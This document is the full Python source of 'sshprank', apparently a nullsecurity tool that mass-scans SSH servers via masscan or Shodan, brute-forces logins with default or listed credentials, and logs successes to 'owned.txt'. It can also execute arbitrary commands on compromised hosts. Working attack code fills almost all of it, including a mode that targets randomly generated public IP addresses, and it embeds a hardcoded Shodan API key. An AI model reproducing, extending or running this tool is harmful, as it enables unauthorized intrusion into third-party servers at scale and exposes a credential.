#!/usr/bin/python3
# -*- coding: utf-8 -*- ########################################################
#               ____                     _ __                                  #
#    ___  __ __/ / /__ ___ ______ ______(_) /___ __                            #
#   / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                            #
#  /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                             #
#                                           /___/ team                         #
#                                                                              #
# sshprank                                                                     #
# A fast SSH mass-scanner, login cracker and banner grabber tool using the     #
# python-masscan and shodan module.                                            #
#                                                                              #
# NOTES                                                                        #
# quick'n'dirty code                                                           #
#                                                                              #
# AUTHOR                                                                       #
# noptrix                                                                      #
#                                                                              #
################################################################################


import getopt
import os
import sys
import socket
import time
import random
import ipaddress
from concurrent.futures import \
  ThreadPoolExecutor, as_completed, wait, ALL_COMPLETED
import warnings
import logging
import masscan
import paramiko
import shodan
import mmap
from collections import deque


__author__ = 'noptrix'
__version__ = '1.4.2'
__copyright = 'santa clause'
__license__ = 'MIT'


SUCCESS = 0
FAILURE = 1

NORM = '\033[0;37;10m'
BOLD = '\033[1;37;10m'
RED = '\033[1;31;10m'
GREEN = '\033[1;32;10m'
YELLOW = '\033[1;33;10m'
BLUE = '\033[1;34;10m'

BANNER = BLUE + '''\
              __                           __
   __________/ /_  ____  _________ _____  / /__
  / ___/ ___/ __ \/ __ \/ ___/ __ `/ __ \/ //_/
 (__  |__  ) / / / /_/ / /  / /_/ / / / / ,<
/____/____/_/ /_/ .___/_/   \__,_/_/ /_/_/|_|
               /_/
''' + NORM + '''
      --== [ by nullsecurity.net ] ==--'''

HELP = BOLD + '''usage''' + NORM + '''

  sshprank <mode> [opts] | <misc>

''' + BOLD + '''modes''' + NORM + '''

  -h <hosts[:ports]>    - single host or host list to crack. multiple ports
                          can be separated by comma, e.g.: 127.0.0.1:22,222,2022
                          (default port: 22)

  -m <opts> [-r <num>]  - pass arbitrary masscan opts, portscan given hosts and
                          crack for logins. found sshd services will be saved to
                          'sshds.txt' in supported format for '-h' option and
                          even for '-b'. use '-r' for generating random ipv4
                          addresses rather than scanning given hosts. these
                          options are always on: '-sS -oX - --open'.
                          NOTE: if you intent to use the '--banner' option then
                          you need to specify '--source-ip <some_ipaddr>' which
                          is needed by masscan. better check masscan options!

  -s <str;page;lim>     - search ssh servers using shodan and crack logins.
                          see examples below. note: you need a better API key
                          than this one i offer in order to search more than 100
                          (= 1 page) ssh servers. so if you use this one use
                          '1' for 'page'.

  -b <file>             - list of hosts to grab sshd banner from
                          format: <host>[:ports]. multiple ports can be
                          separated by comma (default port: 22)

''' + BOLD + '''options''' + NORM + '''

  -r <num>              - generate <num> random ipv4 addresses, check for open
                          sshd port and crack for login (only with -m option!)
  -u <user|file>        - single username or user list (default: root)
  -p <pass|file>        - single password or password list (default: root)
  -c <file>             - list of user:pass combination
  -C <cmd|file>         - read commands from file (line by line) or execute a
                          single command on host if login was cracked
  -N                    - do not output ssh command results
  -x <num>              - num threads for parallel host crack (default: 50)
  -S <num>              - num threads for parallel service crack (default: 20)
  -X <num>              - num threads for parallel login crack (default: 5)
  -B <num>              - num threads for parallel banner grabbing (default: 70)
  -T <sec>              - num sec for auth and connect timeout (default: 5s)
  -R <sec>              - num sec for (banner) read timeout (default: 3s)
  -o <file>             - write found logins to file. format:
                          <host>:<port>:<user>:<pass> (default: owned.txt)
  -e                    - exclude host after first login was found. continue
                          with other hosts instead
  -E                    - exit sshprank completely after first login was found
  -v                    - verbose mode. show found logins, sshds, etc.
                          (default: off)

''' + BOLD + '''misc''' + NORM + '''

  -H                    - print help
  -V                    - print version information

''' + BOLD + '''examples''' + NORM + '''

  # crack targets from a given list with user admin, pw-list and 20 host-threads
  $ sshprank -h sshds.txt -u admin -P /tmp/passlist.txt -x 20

  # first scan then crack from founds ssh services using 'root:admin'
  $ sudo sshprank -m '-p22,2022 --rate 5000 --source-ip 192.168.13.37 \\
    --range 192.168.13.1/24' -p admin

  # generate 1k random ipv4 addresses, then port-scan (tcp/22 here) with 1k p/s
  # and crack logins using 'root:root' on found sshds
  $ sudo sshprank -m '-p22 --rate=1000' -r 1000 -v

  # search 50 ssh servers via shodan and crack logins using 'root:root' against
  # found sshds
  $ sshprank -s 'SSH;1;50'

  # grab banners and output to file with format supported for '-h' option
  $ sshprank -b hosts.txt > sshds2.txt
'''

stargets = []   # shodan
excluded = {}
opts = {
  'targets': [],
  'targetlist': [],
  'masscan_opts': '--open ',
  'sho_opts': None,
  'sho_str': None,
  'sho_page': None,
  'sho_lim': None,
  'sho_key': 'Pp1oDSiavzKQJSsRgdzuxFJs8PQXzBL9',
  'user': 'root',
  'pass': 'root',
  'cmd': None,
  'cmd_no_out': False,
  'hthreads': 50,
  'sthreads': 20,
  'lthreads': 5,
  'bthreads': 70,
  'ctimeout': 5,
  'rtimeout': 3,
  'logfile': 'owned.txt',
  'exclude': False,
  'exit': False,
  'verbose': False
}


def log(msg='', _type='normal', pre_esc='', esc='\n'):
  iprefix = f'{BOLD}{BLUE}[+] {NORM}'
  gprefix = f'{BOLD}{GREEN}[*] {NORM}'
  wprefix = f'{BOLD}{YELLOW}[!] {NORM}'
  eprefix = f'{BOLD}{RED}[-] {NORM}'

  if _type == 'normal':
    sys.stdout.write(f'{msg}')
  elif _type == 'verbose':
    sys.stdout.write(f'    > {msg}{esc}')
  elif _type == 'info':
    sys.stderr.write(f'{pre_esc}{iprefix}{msg}{esc}')
  elif _type == 'good':
    sys.stderr.write(f'{pre_esc}{gprefix}{msg}{esc}')
  elif _type == 'warn':
    sys.stderr.write(f'{pre_esc}{wprefix}{msg}{esc}')
  elif _type == 'error':
    sys.stderr.write(f'{pre_esc}{eprefix}{msg}{esc}')
    os._exit(FAILURE)
  elif _type == 'spin':
    sys.stderr.flush()
    for i in ('-', '\\', '|', '/'):
      sys.stderr.write(f'{pre_esc}{BOLD}{BLUE}[{i}] {NORM}{msg}')
      #time.sleep(0.02)

  return


def parse_target(target):
  if target.endswith(':'):
    target = target.rstrip(':')

  dtarget = {target.rstrip(): ['22']}

  if ':' in target:
    starget = target.split(':')
    if starget[1]:
      try:
        if ',' in starget[1]:
          ports = [p.rstrip() for p in starget[1].split(',')]
        else:
          ports = [starget[1].rstrip('\n')]
        ports = list(filter(None, ports))
        dtarget = {starget[0].rstrip(): ports}
      except ValueError as err:
        log(err.args[0].lower(), 'error')

  return dtarget


def read_file(_file):
  try:
    with open(_file, 'r', encoding='latin-1') as f:
      with mmap.mmap(f.fileno(), length=0, access=mmap.ACCESS_READ) as m:
        return m.read().decode('latin-1').split()
  except:
    log(f'could not read from {_file}', 'error')


def parse_cmdline(cmdline):
  global opts

  try:
    _opts, _args = getopt.getopt(cmdline,
      'h:m:s:b:r:u:p:c:C:Nx:S:X:B:T:R:o:eEvVH')
    for o, a in _opts:
      if o == '-h':
        if os.path.isfile(a):
          opts['targetlist'] = a
        else:
          opts['targets'] = parse_target(a)
      if o == '-m':
        opts['masscan_opts'] += a
      if o == '-s':
        opts['sho_opts'] = a
      if o == '-b':
        opts['targetlist'] = a
      if o == '-r':
        opts['random'] = int(a)
      if o == '-u':
        if os.path.isfile(a):
          opts['userlist'] = read_file(a)
        else:
          opts['user'] = a
      if o == '-p':
        if os.path.isfile(a):
          opts['passlist'] = read_file(a)
        else:
          opts['pass'] = a
      if o == '-c':
        opts['combolist'] = read_file(a)
      if o == '-C':
        opts['cmd'] = a
      if o == '-N':
        opts['cmd_no_out'] = True
      if o == '-x':
        opts['hthreads'] = int(a)
      if o == '-S':
        opts['sthreads'] = int(a)
      if o == '-X':
        opts['lthreads'] = int(a)
      if o == '-B':
        opts['bthreads'] = int(a)
      if o == '-T':
        opts['ctimeout'] = int(a)
      if o == '-R':
        opts['rtimeout'] = int(a)
      if o == '-o':
        opts['logfile'] = a
      if o == '-e':
        opts['exclude'] = True
      if o == '-E':
        opts['exit'] = True
      if o == '-v':
        opts['verbose'] = True
      if o == '-V':
        log(f'sshprank v{__version__}', _type='info')
        sys.exit(SUCCESS)
      if o == '-H':
        log(HELP)
        sys.exit(SUCCESS)
  except (getopt.GetoptError, ValueError) as err:
    log(err.args[0].lower(), 'error')

  return


def check_argv(cmdline):
  modes = False
  needed = ['-h', '-m', '-s', '-b', '-H', '-V']

  if set(needed).isdisjoint(set(cmdline)):
    log('wrong usage dude, check help', 'error')

  if '-h' in cmdline:
    if '-m' in cmdline or '-s' in cmdline or '-b' in cmdline:
      modes = True
  if '-m' in cmdline:
    if '-h' in cmdline or '-s' in cmdline or '-b' in cmdline:
      modes = True
  if '-s' in cmdline:
    if '-h' in cmdline or '-m' in cmdline or '-b' in cmdline:
      modes = True
  if '-b' in cmdline:
    if '-h' in cmdline or '-m' in cmdline or '-s' in cmdline:
      modes = True

  if modes:
    log('choose only one mode', 'error')

  return


def check_argc(cmdline):
  if len(cmdline) == 0:
    log('use -H for help', 'error')

  return


def grab_banner(host, port):
  try:
    with socket.create_connection((host, port), opts['ctimeout']) as s:
      s.settimeout(opts['rtimeout'])
      banner = str(s.recv(1024).decode('utf-8')).strip()
      if not banner:
        banner = '<NO BANNER>'
      log(f'{host}:{port}:{banner}\n')
      s.settimeout(None)
  except socket.timeout:
    if opts['verbose']:
      log(f'socket timeout: {host}:{port}', 'warn')
  except:
    if opts['verbose']:
      log(f'could not connect: {host}:{port}', 'warn')
  finally:
    s.close()

  return


class PortScanner(masscan.PortScanner):
    @property
    def scan_result(self):
        return self._scan_result


def portscan():
  try:
    m = PortScanner()
    m.scan(hosts='', ports='0', arguments=opts['masscan_opts'], sudo=True)
  except masscan.NetworkConnectionError as err:
    log('\n')
    log('no sshds found or network unreachable', 'error')
  except Exception as err:
    log('\n')
    log(f'unknown masscan error occured: str({err})', 'error')

  return m


def grep_service(scan, service='ssh', prot='tcp'):
  targets = []

  scan_result = scan.scan_result
  for h in scan_result['scan'].keys():
    for p in scan_result['scan'][h][prot]:
      if scan_result['scan'][h][prot][p]['state'] == 'open':
        if scan_result['scan'][h][prot][p]['services']:
          for s in scan_result['scan'][h][prot][p]['services']:
            target = f"{h}:{str(p)}:{s['banner']}\n"
            if opts['verbose']:
              log(f'found sshd: {target}', 'good', esc='')
            if service in s['name']:
              targets.append(target)
        else:
          if opts['verbose']:
            log(f'found sshd: {h}:{str(p)}:<no banner grab>', 'good', esc='\n')
          targets.append(f'{h}:{str(p)}:<no banner grab>\n')

  return targets


def log_targets(targets, logfile):
  try:
    with open(logfile, 'a+') as f:
      f.writelines(targets)
  except (FileNotFoundError, PermissionError) as err:
    log(f'{err.args[1].lower()}: {logfile}', 'error')

  return


def status(future, msg, pre_esc=''):
  while future.running():
    log(msg, 'spin', pre_esc)

  return


def crack_login(host, port, username, password):
  global excluded

  cli = paramiko.SSHClient()
  cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())

  try:
    if port not in excluded[host]:
      cli.connect(host, port, username, password, timeout=opts['ctimeout'],
        allow_agent=False, look_for_keys=False, auth_timeout=opts['ctimeout'])
      login = f'{host}:{port}:{username}:{password}'
      log_targets(f'{login}\n', opts['logfile'])
      if opts['exclude']:
        excluded[host].add(port)
      if opts['verbose']:
        log(f'found login: {login}', _type='good')
      else:
        log(f'found a login (check {opts["logfile"]})', _type='good')
      if opts['cmd']:
        if os.path.isfile(opts['cmd']):
          log(f"sending ssh commands from {opts['cmd']}", 'info')
          with open(opts['cmd'], 'r', encoding='latin-1') as _file:
            for line in _file:
              stdin, stdout, stderr = cli.exec_command(line, timeout=2)
              if not opts['cmd_no_out']:
                rl = stdout.readlines()
                if len(rl) > 0:
                  log(f'ssh command result for: \'{line.rstrip()}\'', 'good',
                    pre_esc='\n')
                  for line in rl:
                    log(f'{line}')
        else:
          log('sending your single ssh command line', 'info')
          if not opts['cmd_no_out']:
            stdin, stdout, stderr = cli.exec_command(opts['cmd'], timeout=2)
            log(f"ssh command results for \'{opts['cmd'].rstrip()}\'", 'good')
            for line in stdout.readlines():
              log(line)
      if opts['exit']:
        log('game over', 'info')
        os._exit(SUCCESS)
      return SUCCESS
  except paramiko.AuthenticationException as err:
    if opts['verbose']:
      if 'publickey' in str(err):
        reason = 'pubkey auth'
        excluded[host].add(port)
      elif 'Authentication failed' in str(err):
        reason = 'auth failed'
      elif 'Authentication timeout' in str(err):
        reason = 'auth timeout'
      else:
        reason = 'unknown'
      log(f'login failure: {host}:{port} ({reason})', 'warn')
    else:
      pass
  except (paramiko.ssh_exception.NoValidConnectionsError, socket.error):
    if opts['verbose']:
      log(f'could not connect: {host}:{port}', 'warn')
    excluded[host].add(port)
  except paramiko.SSHException as err:
    #if opts['verbose']:
    #  log(f'paramiko: {str(err)}', 'warn')
    pass
  except Exception as err:
    #if opts['verbose']:
    #  log(f'other error: {str(err)}', 'warn')
    pass
  finally:
    cli.close()

  return


def run_threads(host, ports, val='single'):
  global excluded

  excluded[host] = set()

  with ThreadPoolExecutor(opts['sthreads']) as e:
    for port in ports:
      if port not in excluded[host]:
        e.submit(crack_login, host, port, opts['user'], opts['pass'])

    with ThreadPoolExecutor(opts['lthreads']) as exe:
      if 'userlist' in opts and 'passlist' in opts:
        for u in opts['userlist']:
          for p in opts['passlist']:
            exe.submit(crack_login, host, port, u.rstrip(), p.rstrip())

      if 'userlist' in opts and 'passlist' not in opts:
        for u in opts['userlist']:
          exe.submit(crack_login, host, port, u.rstrip(), opts['pass'])

      if 'passlist' in opts and 'userlist' not in opts:
        for p in opts['passlist']:
          exe.submit(crack_login, host, port, opts['user'], p.rstrip())

      if 'combolist' in opts:
        for line in opts['combolist']:
          try:
            l = line.split(':')
            exe.submit(crack_login, host, port, l[0].rstrip(), l[1].rstrip())
          except IndexError:
            log('combo list format: <user>:<pass>', 'error')

      if opts['exit']:
        for x in as_completed(futures):
          if x.result() == SUCCESS:
            os._exit(SUCCESS)

  return


def gen_ipv4addr():
  try:
    ip = ipaddress.ip_address('.'.join(str(
      random.randint(0, 255)) for _ in range(4)))
    if not ip.is_loopback and not ip.is_private and not ip.is_multicast:
      return str(ip)
  except:
    pass

  return


def crack_single():
  host, ports = list(opts['targets'].copy().items())[0]
  run_threads(host, ports)

  return


def crack_multi():
  try:
    with open(opts['targetlist'], 'r', encoding='latin-1') as f:
      with ThreadPoolExecutor(opts['hthreads']) as exe:
        for line in f:
          host = line.rstrip()
          if ':' in line:
            host = line.split(':')[0]
            ports = [p.rstrip() for p in line.split(':')[1].split(',')]
          else:
            ports = ['22']
          exe.submit(run_threads, host, ports)
  except (FileNotFoundError, PermissionError) as err:
    log(f"{err.args[1].lower()}: {opts['targetlist']}", 'error')

  return


def crack_random():
  ptargets = []

  for _ in range(opts['random']):
    ptargets.append(gen_ipv4addr())
  ptargets = [x for x in ptargets if x is not None]

  opts['masscan_opts'] += ' ' + ' '.join(ptargets)

  return


def crack_scan():
  global opts

  with ThreadPoolExecutor(1) as e:
    future = e.submit(portscan)
    status(future, 'scanning sshds', pre_esc='\r')
  log('\n')
  targets = grep_service(future.result())
  num_targets = len(targets)

  if num_targets > 0:
    opts['targetlist'] = 'sshds.txt'
    log_targets(targets, opts['targetlist'])
    log(f'found {num_targets} active sshds', 'good')
    with ThreadPoolExecutor(1) as e:
      future = e.submit(crack_multi)
      status(future, 'cracking found sshds\r')
    log('\n')
  else:
    log('no sshds found :(', _type='warn')

  return


def check_banners():
  try:
    with open(opts['targetlist'], 'r', encoding='latin-1') as f:
      with ThreadPoolExecutor(opts['bthreads']) as exe:
        for line in f:
          target = parse_target(line)
          host = ''.join([*target])
          ports = target.get(host)
          for port in ports:
            f = exe.submit(grab_banner, host, port)
  except (FileNotFoundError, PermissionError) as err:
    log(f"{err.args[1].lower()}: {opts['targetlist']}", 'error')

  return


def crack_shodan(targets):
  log(f'w00t w00t, found {len(targets)} sshds', 'good')
  log('cracking shodan targets', 'info')
  opts['targetlist'] = 'sshds.txt'
  log_targets(targets, opts['targetlist'])
  log(f'saved found sshds to {opts["targetlist"]}', 'info')
  log('cracking found targets', 'info')
  crack_multi()

  return


def shodan_search():
  global opts
  global stargets

  s = opts['sho_opts'].split(';')
  if len(s) != 3:
    log('format wrong, check usage and examples', 'error')
  opts['sho_str'] = s[0]
  opts['sho_page'] = s[1]
  opts['sho_lim'] = s[2]

  try:
    api = shodan.Shodan(opts['sho_key'])
    res = api.search(opts['sho_str'], opts['sho_page'], opts['sho_lim'])
    for r in res['matches']:
      if len(r) > 0:
        banner = r['data'].split('\n')[0]
        if opts['verbose']:
          log(f'found sshd: {r["ip_str"]}:{r["port"]}:{banner}', 'good',
            esc='\n')
        stargets.append(f'{r["ip_str"]}:{r["port"]}:{banner}\n')
  except shodan.APIError as e:
    log(f'shodan error: {str(e)}', 'error')

  return


def is_root():
  if os.geteuid() == 0:
    return True

  return False


def main(cmdline):
  sys.stderr.write(BANNER + '\n\n')
  check_argc(cmdline)
  parse_cmdline(cmdline)
  check_argv(cmdline)
  futures = deque()

  log('game started', 'info')
  try:
    if not opts['targetlist'] and opts['targets']:
      log('cracking single target', 'info')
      crack_single()
    elif len(opts['targetlist']) > 0 and '-b' not in cmdline:
      with ThreadPoolExecutor(1) as e:
        future = e.submit(crack_multi)
        status(future, 'cracking multiple targets\r')
      log('\n')
    elif '-m' in cmdline:
      if is_root():
        if '-r' in cmdline:
          log('scanning and cracking random targets', 'info')
          crack_random()
          crack_scan()
        else:
          log('scanning and cracking targets', 'info')
          crack_scan()
      else:
        log('get r00t for this option', 'error')
    elif '-s' in cmdline:
      with ThreadPoolExecutor(1) as e:
        future = e.submit(shodan_search)
        status(future, 'searching for sshds via shodan\r')
      log('\n')
      if len(stargets) > 0:
        crack_shodan(stargets)
      else:
        log('no sshds found :(', 'info')
    elif '-b' in cmdline:
      log('grabbing banners', 'info', esc='\n')
      check_banners()
  except KeyboardInterrupt:
    log('\n')
    log('you aborted me', _type='warn')
    os._exit(SUCCESS)
  finally:
    log('game over', 'info')

  return


if __name__ == '__main__':
  logger = logging.getLogger()
  logger.disabled = True
  logger.setLevel(100)
  logger.propagate = False
  logging.disable(logging.ERROR)
  logging.disable(logging.FATAL)
  logging.disable(logging.CRITICAL)
  logging.disable(logging.DEBUG)
  logging.disable(logging.WARNING)
  logging.disable(logging.INFO)
  if not sys.warnoptions:
    warnings.simplefilter('ignore')

  main(sys.argv[1:])

